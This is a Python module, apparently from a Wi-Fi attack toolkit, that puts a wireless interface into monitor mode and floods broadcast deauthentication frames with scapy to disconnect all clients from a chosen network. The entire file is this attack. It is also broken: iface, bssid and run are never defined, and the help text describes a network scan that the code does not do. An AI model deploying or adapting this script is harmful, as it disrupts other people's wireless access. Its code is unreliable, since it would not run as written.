import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *


class deauth_network():

    def __init__(self):
        self.req_var = True
        self.opt_var = False
        self.req_variables = ["-s"]

    def help(self):
        hlp = (
            "\nDescription:\n"
            "############\n"
            "\nCommand will show all near by wifi networks\n"
            "\nUsage:\n"
            "############\n"
            "\n'deauth-network -s <ssid>'\n"
        )

        return hlp

    def deauth_network(self, var):
        if "-s" in var:
            try:
                # make sure device is in monitor mode
                os.system("sudo ifconfig " + iface + " down")
                os.system("sudo iwconfig " + iface + " mode monitor")
                os.system("sudo ifconfig " + iface + " up")

                # creating deauth packet to send
                packet = (
                    RadioTap() /
                    Dot11(
                        type=0, addr1="ff:ff:ff:ff:ff:ff",
                        addr2=bssid,
                        addr3=bssid) / Dot11Deauth()
                )
                print("Sending Deautherization Packets")
                print("Use control+c to stop")
                while run:
                    try:
                        sendp(packet, iface=iface, verbose=False)
                    except KeyboardInterrupt:
                        run = False
                        print("Deautherization has stopped")

            except Exception:
                error = []
                error.append("1")
                error.append("Cannot deauth the network " + "'" + var["-s"] + "'")
                return error